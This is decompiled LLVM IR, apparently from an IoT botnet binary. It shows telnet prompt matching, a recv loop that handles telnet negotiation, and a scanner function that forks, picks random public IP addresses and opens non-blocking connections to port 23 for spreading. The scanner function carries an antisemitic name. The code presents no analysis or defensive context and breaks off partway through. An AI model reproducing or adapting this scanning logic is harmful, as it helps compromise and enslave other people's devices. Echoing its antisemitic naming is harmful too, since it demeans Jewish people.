define i32 @matchPrompt(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_1000d314 = call i32 @__GI_strlen()
  store i32 ptrtoint ([6 x i8]* @global_var_1002bc24.511 to i32), i32* @r3, align 4
  %v0_1000d45010 = call i32 @__GI_strlen()
  %v2_1000d45812 = icmp eq i32 %v0_1000d45010, 0
  br i1 %v2_1000d45812, label %dec_label_pc_1000d468, label %dec_label_pc_1000d340.preheader.lr.ph

dec_label_pc_1000d340.preheader.lr.ph:            ; preds = %entry
  %v2_1000d35c = add i32 %v0_1000d314, %arg1
  br label %dec_label_pc_1000d340.preheader

dec_label_pc_1000d334:                            ; preds = %dec_label_pc_1000d3c8, %dec_label_pc_1000d3a0, %dec_label_pc_1000d378, %dec_label_pc_1000d350
  %v1_1000d338 = add nsw i32 %stack_var_-40.08, 1
  %v3_1000d348 = icmp sgt i32 %v0_1000d314, %v1_1000d338
  br i1 %v3_1000d348, label %dec_label_pc_1000d350, label %dec_label_pc_1000d3f0

dec_label_pc_1000d350:                            ; preds = %dec_label_pc_1000d340.preheader, %dec_label_pc_1000d334
  %stack_var_-40.08 = phi i32 [ %v1_1000d338, %dec_label_pc_1000d334 ], [ %stack_var_-40.115, %dec_label_pc_1000d340.preheader ]
  %v2_1000d364 = sub i32 %v2_1000d35c, %stack_var_-40.08
  %v1_1000d368 = inttoptr i32 %v2_1000d364 to i8*
  %v2_1000d368 = load i8, i8* %v1_1000d368, align 1
  %v3_1000d370 = icmp eq i8 %v2_1000d368, 0
  br i1 %v3_1000d370, label %dec_label_pc_1000d334, label %dec_label_pc_1000d378

dec_label_pc_1000d378:                            ; preds = %dec_label_pc_1000d350
  %v2_1000d390 = load i8, i8* %v1_1000d368, align 1
  %v3_1000d398 = icmp eq i8 %v2_1000d390, 32
  br i1 %v3_1000d398, label %dec_label_pc_1000d334, label %dec_label_pc_1000d3a0

dec_label_pc_1000d3a0:                            ; preds = %dec_label_pc_1000d378
  %v2_1000d3b8 = load i8, i8* %v1_1000d368, align 1
  %v3_1000d3c0 = icmp eq i8 %v2_1000d3b8, 13
  br i1 %v3_1000d3c0, label %dec_label_pc_1000d334, label %dec_label_pc_1000d3c8

dec_label_pc_1000d3c8:                            ; preds = %dec_label_pc_1000d3a0
  %v2_1000d3e0 = load i8, i8* %v1_1000d368, align 1
  %v3_1000d3e8 = icmp eq i8 %v2_1000d3e0, 10
  br i1 %v3_1000d3e8, label %dec_label_pc_1000d334, label %dec_label_pc_1000d3f0

dec_label_pc_1000d3f0:                            ; preds = %dec_label_pc_1000d3c8, %dec_label_pc_1000d334, %dec_label_pc_1000d340.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %stack_var_-40.115, %dec_label_pc_1000d340.preheader ], [ %stack_var_-40.08, %dec_label_pc_1000d3c8 ], [ %v1_1000d338, %dec_label_pc_1000d334 ]
  %v2_1000d404 = sub i32 %v2_1000d35c, %stack_var_-40.0.lcssa
  %v1_1000d408 = inttoptr i32 %v2_1000d404 to i8*
  %v2_1000d408 = load i8, i8* %v1_1000d408, align 1
  %v2_1000d41c = add i32 %storemerge316, ptrtoint ([6 x i8]* @global_var_1002bc24.511 to i32)
  %v1_1000d420 = inttoptr i32 %v2_1000d41c to i8*
  %v2_1000d420 = load i8, i8* %v1_1000d420, align 1
  %v4_1000d428 = icmp eq i8 %v2_1000d408, %v2_1000d420
  br i1 %v4_1000d428, label %dec_label_pc_1000d468, label %dec_label_pc_1000d43c

dec_label_pc_1000d43c:                            ; preds = %dec_label_pc_1000d3f0
  %v1_1000d440 = add i32 %storemerge316, 1
  store i32 ptrtoint ([6 x i8]* @global_var_1002bc24.511 to i32), i32* @r3, align 4
  %v0_1000d450 = call i32 @__GI_strlen()
  %v2_1000d458 = icmp ult i32 %v1_1000d440, %v0_1000d450
  br i1 %v2_1000d458, label %dec_label_pc_1000d340.preheader, label %dec_label_pc_1000d468

dec_label_pc_1000d340.preheader:                  ; preds = %dec_label_pc_1000d340.preheader.lr.ph, %dec_label_pc_1000d43c
  %storemerge316 = phi i32 [ 0, %dec_label_pc_1000d340.preheader.lr.ph ], [ %v1_1000d440, %dec_label_pc_1000d43c ]
  %stack_var_-40.115 = phi i32 [ 0, %dec_label_pc_1000d340.preheader.lr.ph ], [ %stack_var_-40.0.lcssa, %dec_label_pc_1000d43c ]
  %v3_1000d3486 = icmp sgt i32 %v0_1000d314, %stack_var_-40.115
  br i1 %v3_1000d3486, label %dec_label_pc_1000d350, label %dec_label_pc_1000d3f0

dec_label_pc_1000d468:                            ; preds = %entry, %dec_label_pc_1000d3f0, %dec_label_pc_1000d43c
  %storemerge = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_1000d3f0 ], [ 0, %dec_label_pc_1000d43c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-40.115, { 2, 0, 1 }
  uselistorder i32 %storemerge316, { 1, 0 }
  uselistorder i32 %v1_1000d440, { 1, 0 }
  uselistorder i32 %v0_1000d314, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1002bc24.511 to i32), { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d468, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d340.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000d3f0, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %v0_1000d4bc = load i32, i32* @r10, align 4
  store i32 %arg4, i32* %stack_var_-64, align 4
  %v1_1000d6fc5 = add i32 %v0_1000d4bc, 2
  %v2_1000d7046 = icmp slt i32 %v1_1000d6fc5, %arg7
  br i1 %v2_1000d7046, label %dec_label_pc_1000d70c.lr.ph, label %dec_label_pc_1000d73c

dec_label_pc_1000d70c.lr.ph:                      ; preds = %entry
  %v2_1000d4f4 = ptrtoint i32* %stack_var_-192 to i32
  %v1_1000d53c = udiv i32 %arg1, 32
  %v1_1000d544 = mul nuw nsw i32 %v1_1000d53c, 4
  %v2_1000d548 = ptrtoint i32* %stack_var_-216 to i32
  %v2_1000d54c = add nuw nsw i32 %v1_1000d544, 24
  %v1_1000d550 = add i32 %v2_1000d54c, %v2_1000d548
  %v1_1000d554 = inttoptr i32 %v1_1000d550 to i32*
  %v1_1000d55c = urem i32 %arg1, 32
  %v3_1000d564 = shl i32 1, %v1_1000d55c
  %v1_1000d584 = add i32 %arg1, 1
  %v2_1000d58c = ptrtoint i32* %stack_var_-64 to i32
  %v4_1000d6bc = inttoptr i32 %arg2 to i8*
  %v3_1000d6d0 = icmp eq i32 %arg3, 0
  %v2_1000d71c = icmp sgt i32 %arg5, 0
  br label %dec_label_pc_1000d70c

dec_label_pc_1000d4f4:                            ; preds = %dec_label_pc_1000d718, %dec_label_pc_1000d70c
  store i32 %v2_1000d4f4, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-192, align 4
  br label %dec_label_pc_1000d508.dec_label_pc_1000d508_crit_edge

dec_label_pc_1000d508.dec_label_pc_1000d508_crit_edge: ; preds = %dec_label_pc_1000d508.dec_label_pc_1000d508_crit_edge.dec_label_pc_1000d508.dec_label_pc_1000d508_crit_edge_crit_edge, %dec_label_pc_1000d4f4
  %v3_1000d50c.pre = phi i32 [ %v2_1000d4f4, %dec_label_pc_1000d4f4 ], [ %v3_1000d50c.pre.pre, %dec_label_pc_1000d508.dec_label_pc_1000d508_crit_edge.dec_label_pc_1000d508.dec_label_pc_1000d508_crit_edge_crit_edge ]
  %v1_1000d52436 = phi i32 [ 1, %dec_label_pc_1000d4f4 ], [ %v1_1000d524, %dec_label_pc_1000d508.dec_label_pc_1000d508_crit_edge.dec_label_pc_1000d508.dec_label_pc_1000d508_crit_edge_crit_edge ]
  %v1_1000d510 = mul nuw nsw i32 %v1_1000d52436, 4
  %v2_1000d514 = add i32 %v1_1000d510, %v3_1000d50c.pre
  %v2_1000d51c = inttoptr i32 %v2_1000d514 to i32*
  store i32 0, i32* %v2_1000d51c, align 4
  %v1_1000d524 = add nuw nsw i32 %v1_1000d52436, 1
  %tmp33 = icmp ult i32 %v1_1000d524, 32
  br i1 %tmp33, label %dec_label_pc_1000d508.dec_label_pc_1000d508_crit_edge.dec_label_pc_1000d508.dec_label_pc_1000d508_crit_edge_crit_edge, label %dec_label_pc_1000d538

dec_label_pc_1000d508.dec_label_pc_1000d508_crit_edge.dec_label_pc_1000d508.dec_label_pc_1000d508_crit_edge_crit_edge: ; preds = %dec_label_pc_1000d508.dec_label_pc_1000d508_crit_edge
  %v3_1000d50c.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_1000d508.dec_label_pc_1000d508_crit_edge

dec_label_pc_1000d538:                            ; preds = %dec_label_pc_1000d508.dec_label_pc_1000d508_crit_edge
  %v2_1000d554 = load i32, i32* %v1_1000d554, align 4
  %v2_1000d568 = or i32 %v2_1000d554, %v3_1000d564
  store i32 %v2_1000d568, i32* %v1_1000d554, align 4
  store i32 268490152, i32* @lr, align 4
  %v5_1000d5a4 = call i32 @__libc_select(i32 %v1_1000d584, i32 %v2_1000d4f4, i32 0, i32 0, i32 %v2_1000d58c)
  %tmp34 = icmp slt i32 %v5_1000d5a4, 1
  br i1 %tmp34, label %dec_label_pc_1000d73c, label %dec_label_pc_1000d5b4

dec_label_pc_1000d5b4:                            ; preds = %dec_label_pc_1000d538
  %v2_1000d5c0 = add i32 %stack_var_-196.09, %arg6
  store i32 268490204, i32* @lr, align 4
  %v4_1000d5d8 = call i32 @recv(i32 %arg1, i32 %v2_1000d5c0, i32 1, i32 0)
  %v4_1000d5ec = icmp eq i32 %v4_1000d5d8, -1
  br i1 %v4_1000d5ec, label %dec_label_pc_1000d600, label %dec_label_pc_1000d5f4

dec_label_pc_1000d5f4:                            ; preds = %dec_label_pc_1000d5b4
  %v3_1000d5f8 = icmp eq i32 %v4_1000d5d8, 0
  br i1 %v3_1000d5f8, label %dec_label_pc_1000d600, label %dec_label_pc_1000d60c

dec_label_pc_1000d600:                            ; preds = %dec_label_pc_1000d5f4, %dec_label_pc_1000d5b4
  br label %dec_label_pc_1000d744

dec_label_pc_1000d60c:                            ; preds = %dec_label_pc_1000d5f4
  %v2_1000d614 = add i32 %v4_1000d5d8, %stack_var_-196.09
  %v4_1000d61c = inttoptr i32 %v2_1000d5c0 to i8*
  %v3_1000d620 = load i8, i8* %v4_1000d61c, align 1
  %v3_1000d628 = icmp eq i8 %v3_1000d620, -1
  br i1 %v3_1000d628, label %dec_label_pc_1000d630, label %dec_label_pc_1000d6b4

dec_label_pc_1000d630:                            ; preds = %dec_label_pc_1000d60c
  %v1_1000d634 = add i32 %v2_1000d5c0, 1
  store i32 268490316, i32* @lr, align 4
  %v4_1000d648 = call i32 @recv(i32 %arg1, i32 %v1_1000d634, i32 2, i32 0)
  %v4_1000d65c = icmp eq i32 %v4_1000d648, -1
  br i1 %v4_1000d65c, label %dec_label_pc_1000d670, label %dec_label_pc_1000d664

dec_label_pc_1000d664:                            ; preds = %dec_label_pc_1000d630
  %v3_1000d668 = icmp eq i32 %v4_1000d648, 0
  br i1 %v3_1000d668, label %dec_label_pc_1000d670, label %dec_label_pc_1000d67c

dec_label_pc_1000d670:                            ; preds = %dec_label_pc_1000d664, %dec_label_pc_1000d630
  br label %dec_label_pc_1000d744

dec_label_pc_1000d67c:                            ; preds = %dec_label_pc_1000d664
  %v2_1000d684 = add i32 %v4_1000d648, %v2_1000d614
  store i32 268490396, i32* @lr, align 4
  %v4_1000d698 = call i32 @negotiate(i32 %arg1, i32 %v2_1000d5c0, i32 3, i32 %v2_1000d614)
  %v3_1000d6a0 = icmp eq i32 %v4_1000d698, 0
  br i1 %v3_1000d6a0, label %dec_label_pc_1000d6a8, label %dec_label_pc_1000d6f8.backedge

dec_label_pc_1000d6a8:                            ; preds = %dec_label_pc_1000d67c
  br label %dec_label_pc_1000d744

dec_label_pc_1000d6b4:                            ; preds = %dec_label_pc_1000d60c
  store i32 268490432, i32* @lr, align 4
  %v5_1000d6bc = call i32 @strstr(i32 %arg6, i8* %v4_1000d6bc, i32 %v2_1000d5c0)
  %v3_1000d6c4 = icmp eq i32 %v5_1000d6bc, 0
  br i1 %v3_1000d6c4, label %dec_label_pc_1000d6cc, label %dec_label_pc_1000d730

dec_label_pc_1000d6cc:                            ; preds = %dec_label_pc_1000d6b4
  br i1 %v3_1000d6d0, label %dec_label_pc_1000d6f8.backedge, label %dec_label_pc_1000d6d8

dec_label_pc_1000d6f8.backedge:                   ; preds = %dec_label_pc_1000d6cc, %dec_label_pc_1000d6d8, %dec_label_pc_1000d67c
  %stack_var_-196.0.be = phi i32 [ %v2_1000d684, %dec_label_pc_1000d67c ], [ %v2_1000d614, %dec_label_pc_1000d6cc ], [ %v2_1000d614, %dec_label_pc_1000d6d8 ]
  %v1_1000d6fc = add i32 %stack_var_-196.0.be, 2
  %v2_1000d704 = icmp slt i32 %v1_1000d6fc, %arg7
  br i1 %v2_1000d704, label %dec_label_pc_1000d6f8.backedge.dec_label_pc_1000d70c_crit_edge, label %dec_label_pc_1000d73c

dec_label_pc_1000d6f8.backedge.dec_label_pc_1000d70c_crit_edge: ; preds = %dec_label_pc_1000d6f8.backedge
  %v3_1000d70c.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_1000d70c

dec_label_pc_1000d6d8:                            ; preds = %dec_label_pc_1000d6cc
  %v1_1000d6dc = call i32 @matchPrompt(i32 %arg6)
  %v3_1000d6e4 = icmp eq i32 %v1_1000d6dc, 0
  br i1 %v3_1000d6e4, label %dec_label_pc_1000d6f8.backedge, label %dec_label_pc_1000d730

dec_label_pc_1000d70c:                            ; preds = %dec_label_pc_1000d6f8.backedge.dec_label_pc_1000d70c_crit_edge, %dec_label_pc_1000d70c.lr.ph
  %v3_1000d70c = phi i32 [ %arg4, %dec_label_pc_1000d70c.lr.ph ], [ %v3_1000d70c.pre, %dec_label_pc_1000d6f8.backedge.dec_label_pc_1000d70c_crit_edge ]
  %stack_var_-196.09 = phi i32 [ %v0_1000d4bc, %dec_label_pc_1000d70c.lr.ph ], [ %stack_var_-196.0.be, %dec_label_pc_1000d6f8.backedge.dec_label_pc_1000d70c_crit_edge ]
  %v2_1000d710 = icmp sgt i32 %v3_1000d70c, 0
  br i1 %v2_1000d710, label %dec_label_pc_1000d4f4, label %dec_label_pc_1000d718

dec_label_pc_1000d718:                            ; preds = %dec_label_pc_1000d70c
  br i1 %v2_1000d71c, label %dec_label_pc_1000d4f4, label %dec_label_pc_1000d73c

dec_label_pc_1000d730:                            ; preds = %dec_label_pc_1000d6b4, %dec_label_pc_1000d6d8
  br label %dec_label_pc_1000d744

dec_label_pc_1000d73c:                            ; preds = %dec_label_pc_1000d6f8.backedge, %dec_label_pc_1000d718, %dec_label_pc_1000d538, %entry
  br label %dec_label_pc_1000d744

dec_label_pc_1000d744:                            ; preds = %dec_label_pc_1000d730, %dec_label_pc_1000d6a8, %dec_label_pc_1000d670, %dec_label_pc_1000d600, %dec_label_pc_1000d73c
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_1000d73c ], [ 1, %dec_label_pc_1000d730 ], [ 0, %dec_label_pc_1000d600 ], [ 0, %dec_label_pc_1000d670 ], [ 0, %dec_label_pc_1000d6a8 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %stack_var_-196.09, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.be, { 1, 0 }
  uselistorder i32 %v2_1000d614, { 1, 2, 3, 0 }
  uselistorder i32 %v1_1000d524, { 1, 0 }
  uselistorder i32 %v2_1000d4f4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-64, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_1000d744, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000d73c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000d730, { 1, 0 }
  uselistorder label %dec_label_pc_1000d6f8.backedge, { 1, 0, 2 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1000d780 = icmp sgt i32 %arg1, 2
  br i1 %v2_1000d780, label %dec_label_pc_1000d794, label %dec_label_pc_1000d7a4

dec_label_pc_1000d794:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_1000d79c.512 to i32), i32* @lr, align 4
  %v1_1000d798 = call i32 @close(i32 %arg1)
  br label %dec_label_pc_1000d7a4

dec_label_pc_1000d7a4:                            ; preds = %entry, %dec_label_pc_1000d794
  %storemerge = phi i32 [ 0, %dec_label_pc_1000d794 ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_1000d7a4, { 1, 0 }
}

define i32 @BurnTheJews(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-640 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000d7c4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000d7c4, i32* %stack_var_-640, align 4
  store i32 268490744, i32* @lr, align 4
  %v0_1000d7f4 = call i32 @fork()
  %v3_1000d7fc = icmp eq i32 %v0_1000d7f4, 0
  br i1 %v3_1000d7fc, label %dec_label_pc_1000eba4, label %dec_label_pc_1000d804

dec_label_pc_1000d804:                            ; preds = %entry
  store i32 268490764, i32* @lr, align 4
  %v1_1000d808 = call i32 @__GI_time(i32 0)
  store i32 268490772, i32* @lr, align 4
  %v0_1000d810 = call i32 @__libc_getpid()
  %v2_1000d818 = xor i32 %v1_1000d808, %v0_1000d810
  store i32 268490784, i32* @lr, align 4
  %v0_1000d81c = call i32 @getppid()
  %v2_1000d824 = add i32 %v2_1000d818, %v0_1000d81c
  store i32 ptrtoint ([3 x i8]* @global_var_1000d830.513 to i32), i32* @lr, align 4
  %v1_1000d82c = call i32 @srand(i32 %v2_1000d824)
  store i32 268490808, i32* @lr, align 4
  %v1_1000d834 = call i32 @__GI_time(i32 0)
  store i32 268490816, i32* @lr, align 4
  %v0_1000d83c = call i32 @__libc_getpid()
  %v2_1000d844 = xor i32 %v1_1000d834, %v0_1000d83c
  %v1_1000d84c = call i32 @init_rand(i32 %v2_1000d844)
  store i32 268490836, i32* @lr, align 4
  %v0_1000d850 = call i32 @getdtablesize()
  %v1_1000d858 = add i32 %v0_1000d850, -100
  %v3_1000d868 = icmp sgt i32 %v1_1000d858, %arg2
  br i1 %v3_1000d868, label %dec_label_pc_1000d870, label %dec_label_pc_1000d878

dec_label_pc_1000d870:                            ; preds = %dec_label_pc_1000d804
  br label %dec_label_pc_1000d878

dec_label_pc_1000d878:                            ; preds = %dec_label_pc_1000d804, %dec_label_pc_1000d870
  %stack_var_-596.0 = phi i32 [ %arg2, %dec_label_pc_1000d870 ], [ %v1_1000d858, %dec_label_pc_1000d804 ]
  store i32 2, i32* %stack_var_-56, align 4
  store i32 23, i32* @r3, align 4
  %v1_1000d884 = call i32 @htons(i32 23)
  %v2_1000d890 = ptrtoint i32* %stack_var_-56 to i32
  %v2_1000d894 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000d894, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268490920, i32* @lr, align 4
  %v0_1000d8a4 = call i32 @__GI_memset()
  store i32 1025, i32* @r3, align 4
  store i32 268490928, i32* @lr, align 4
  %v0_1000d8ac = call i32 @malloc()
  store i32 %v0_1000d8ac, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1025, i32* @r5, align 4
  store i32 268490952, i32* @lr, align 4
  %v0_1000d8c4 = call i32 @__GI_memset()
  %v1_1000d8cc = mul i32 %stack_var_-596.0, 32
  %v1_1000d8d0 = or i32 %v1_1000d8cc, 15
  %v1_1000d8d4 = add i32 %v1_1000d8d0, 15
  %v1_1000d8d8 = and i32 %v1_1000d8d4, -16
  %v2_1000d8e0 = load i32, i32* %stack_var_-640, align 4
  %v1_1000d8e8 = load i32, i32* @r1, align 4
  %v3_1000d8e8 = sub i32 %v1_1000d8e8, %v1_1000d8d8
  %v4_1000d8e8 = inttoptr i32 %v3_1000d8e8 to i32*
  store i32 %v2_1000d8e0, i32* %v4_1000d8e8, align 4
  %v1_1000d8f8 = add i32 %v3_1000d8e8, 23
  %v1_1000d8fc = and i32 %v1_1000d8f8, -16
  %v1_1000d918 = mul i32 %stack_var_-596.0, 5
  store i32 %v1_1000d8fc, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 %v1_1000d918, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000d92c.515 to i32), i32* @lr, align 4
  %v0_1000d928 = call i32 @__GI_memset()
  %v2_1000d9a010 = icmp sgt i32 %stack_var_-596.0, 0
  br i1 %v2_1000d9a010, label %dec_label_pc_1000d938, label %dec_label_pc_1000d9a8.preheader

dec_label_pc_1000d938:                            ; preds = %dec_label_pc_1000d878, %dec_label_pc_1000d938
  %storemerge313 = phi i32 [ %v1_1000d990, %dec_label_pc_1000d938 ], [ 0, %dec_label_pc_1000d878 ]
  %v1_1000d940 = mul i32 %storemerge313, 32
  %v2_1000d944 = add i32 %v1_1000d940, %v1_1000d8fc
  store i32 %v2_1000d944, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 32, i32* @r5, align 4
  store i32 268491096, i32* @lr, align 4
  %v0_1000d954 = call i32 @__GI_memset()
  %v3_1000d96c = or i32 %v2_1000d944, 9
  %v4_1000d96c = inttoptr i32 %v3_1000d96c to i8*
  store i8 1, i8* %v4_1000d96c, align 1
  %v1_1000d980 = add i32 %v2_1000d944, 28
  %v2_1000d988 = inttoptr i32 %v1_1000d980 to i32*
  store i32 %v0_1000d8ac, i32* %v2_1000d988, align 4
  %v1_1000d990 = add nuw nsw i32 %storemerge313, 1
  %v2_1000d9a0 = icmp slt i32 %v1_1000d990, %stack_var_-596.0
  br i1 %v2_1000d9a0, label %dec_label_pc_1000d938, label %dec_label_pc_1000d9a8.preheader

dec_label_pc_1000d9a8.preheader:                  ; preds = %dec_label_pc_1000d938, %dec_label_pc_1000d878
  %v2_1000d9f0 = add i32 %v1_1000d8fc, 16
  br label %dec_label_pc_1000d9a8

dec_label_pc_1000d9a8:                            ; preds = %dec_label_pc_1000d9a8, %dec_label_pc_1000eb84, %dec_label_pc_1000d9a8.preheader
  br i1 %v2_1000d9a010, label %dec_label_pc_1000d9b4, label %dec_label_pc_1000d9a8

dec_label_pc_1000d9b4:                            ; preds = %dec_label_pc_1000d9a8, %dec_label_pc_1000eb84
  %storemerge48 = phi i32 [ %v1_1000eb88, %dec_label_pc_1000eb84 ], [ 0, %dec_label_pc_1000d9a8 ]
  %v1_1000d9bc = mul i32 %storemerge48, 32
  %v2_1000d9c0 = add i32 %v1_1000d9bc, %v1_1000d8fc
  %v1_1000d9c4 = add i32 %v2_1000d9c0, 16
  %v1_1000d9c8 = inttoptr i32 %v1_1000d9c4 to i32*
  %v2_1000d9c8 = load i32, i32* %v1_1000d9c8, align 16
  %v3_1000d9cc = icmp eq i32 %v2_1000d9c8, 0
  br i1 %v3_1000d9cc, label %dec_label_pc_1000d9d4, label %dec_label_pc_1000d9fc

dec_label_pc_1000d9d4:                            ; preds = %dec_label_pc_1000d9b4
  store i32 268491232, i32* @lr, align 4
  %v1_1000d9dc = call i32 @__GI_time(i32 0)
  %v1_1000d9ec = mul i32 %storemerge48, 32
  %v1_1000d9f4 = add i32 %v2_1000d9f0, %v1_1000d9ec
  %v2_1000d9f8 = inttoptr i32 %v1_1000d9f4 to i32*
  store i32 %v1_1000d9dc, i32* %v2_1000d9f8, align 16
  br label %dec_label_pc_1000d9fc

dec_label_pc_1000d9fc:                            ; preds = %dec_label_pc_1000d9b4, %dec_label_pc_1000d9d4
  %v1_1000da0c = or i32 %v2_1000d9c0, 8
  %v2_1000da0c = inttoptr i32 %v1_1000da0c to i8*
  %v3_1000da0c = load i8, i8* %v2_1000da0c, align 8
  %v2_1000da1c = icmp ugt i8 %v3_1000da0c, 8
  br i1 %v2_1000da1c, label %dec_label_pc_1000eb84, label %dec_label_pc_1000da24

dec_label_pc_1000da24:                            ; preds = %dec_label_pc_1000d9fc
  %v4_1000da0c = zext i8 %v3_1000da0c to i32
  %v1_1000da28 = mul nuw nsw i32 %v4_1000da0c, 4
  %v2_1000da34 = add i32 %v1_1000da28, ptrtoint (i32* @global_var_1002bd30.516 to i32)
  %v1_1000da38 = inttoptr i32 %v2_1000da34 to i32*
  %v2_1000da38 = load i32, i32* %v1_1000da38, align 4
  %v2_1000da44 = add i32 %v2_1000da38, ptrtoint (i32* @global_var_1002bd30.516 to i32)
  call void @__pseudo_branch(i32 %v2_1000da44)
  %v1_1000da60 = or i32 %v2_1000d9c0, 9
  %v2_1000da60 = inttoptr i32 %v1_1000da60 to i8*
  %v3_1000da60 = load i8, i8* %v2_1000da60, align 1
  %v3_1000da68 = icmp eq i8 %v3_1000da60, 1
  br i1 %v3_1000da68, label %dec_label_pc_1000da70, label %dec_label_pc_1000daec

dec_label_pc_1000da70:                            ; preds = %dec_label_pc_1000da24
  %v1_1000da80 = add i32 %v2_1000d9c0, 28
  %v1_1000da84 = inttoptr i32 %v1_1000da80 to i32*
  %v2_1000da84 = load i32, i32* %v1_1000da84, align 4
  store i32 %v2_1000d9c0, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 32, i32* @r5, align 4
  store i32 268491436, i32* @lr, align 4
  %v0_1000daa8 = call i32 @__GI_memset()
  store i32 %v2_1000da84, i32* %v1_1000da84, align 4
  %v2_1000dacc = call i32 @getRandomPublicIP(i32 %v0_1000daa8, i32 %v1_1000da80)
  %v0_1000dad8 = load i32, i32* @r29, align 4
  %v1_1000dad8 = mul i32 %v0_1000dad8, 32
  %v2_1000dadc = add i32 %v1_1000dad8, %v1_1000d8fc
  %v1_1000dae0 = or i32 %v2_1000dadc, 4
  %v2_1000dae4 = inttoptr i32 %v1_1000dae0 to i32*
  store i32 %v2_1000dacc, i32* %v2_1000dae4, align 4
  br label %dec_label_pc_1000dba8

dec_label_pc_1000daec:                            ; preds = %dec_label_pc_1000da24
  %v3_1000dafc = load i8, i8* %v2_1000da60, align 1
  %v3_1000db04 = icmp eq i8 %v3_1000dafc, 0
  br i1 %v3_1000db04, label %dec_label_pc_1000db0c, label %dec_label_pc_1000dba8

dec_label_pc_1000db0c:                            ; preds = %dec_label_pc_1000daec
  %v1_1000db1c = or i32 %v2_1000d9c0, 10
  %v2_1000db1c = inttoptr i32 %v1_1000db1c to i8*
  %v3_1000db1c = load i8, i8* %v2_1000db1c, align 2
  %tmp34 = icmp ult i8 %v3_1000db1c, 99
  br i1 %tmp34, label %dec_label_pc_1000db48, label %dec_label_pc_1000db2c

dec_label_pc_1000db2c:                            ; preds = %dec_label_pc_1000db0c
  store i8 1, i8* %v2_1000da60, align 1
  br label %dec_label_pc_1000eb84

dec_label_pc_1000db48:                            ; preds = %dec_label_pc_1000db0c
  %v3_1000db58 = load i8, i8* %v2_1000db1c, align 2
  %v1_1000db60 = add i8 %v3_1000db58, 1
  store i8 %v1_1000db60, i8* %v2_1000db1c, align 2
  %v1_1000db88 = or i32 %v2_1000d9c0, 11
  %v2_1000db88 = inttoptr i32 %v1_1000db88 to i8*
  %v3_1000db88 = load i8, i8* %v2_1000db88, align 1
  %v1_1000db90 = add i8 %v3_1000db88, 1
  store i8 %v1_1000db90, i8* %v2_1000db88, align 1
  br label %dec_label_pc_1000dba8

dec_label_pc_1000dba8:                            ; preds = %dec_label_pc_1000daec, %dec_label_pc_1000da70, %dec_label_pc_1000db48
  store i32 2, i32* %stack_var_-56, align 4
  store i32 23, i32* @r3, align 4
  %v1_1000dbb4 = call i32 @htons(i32 23)
  store i32 %v2_1000d894, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268491736, i32* @lr, align 4
  %v0_1000dbd4 = call i32 @__GI_memset()
  store i32 268491784, i32* @lr, align 4
  %v3_1000dc04 = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_1000dc10 = mul i32 %storemerge48, 32
  %v2_1000dc14 = add i32 %v1_1000dc10, %v1_1000d8fc
  %v2_1000dc18 = inttoptr i32 %v2_1000dc14 to i32*
  store i32 %v3_1000dc04, i32* %v2_1000dc18, align 16
  %v1_1000dc2c = inttoptr i32 %v2_1000d9c0 to i32*
  %v2_1000dc2c = load i32, i32* %v1_1000dc2c, align 16
  %v4_1000dc34 = icmp eq i32 %v2_1000dc2c, -1
  br i1 %v4_1000dc34, label %dec_label_pc_1000eb84, label %dec_label_pc_1000dc3c

dec_label_pc_1000dc3c:                            ; preds = %dec_label_pc_1000dba8
  %v2_1000dc60 = load i32, i32* %v1_1000dc2c, align 16
  store i32 268491896, i32* @lr, align 4
  %v3_1000dc74 = call i32 @fcntl(i32 %v2_1000dc60, i32 3, i32 0)
  %v1_1000dc7c = or i32 %v3_1000dc74, 2048
  %v0_1000dc80 = load i32, i32* @r29, align 4
  store i32 268491924, i32* @lr, align 4
  %v3_1000dc90 = call i32 @fcntl(i32 %v0_1000dc80, i32 4, i32 %v1_1000dc7c)
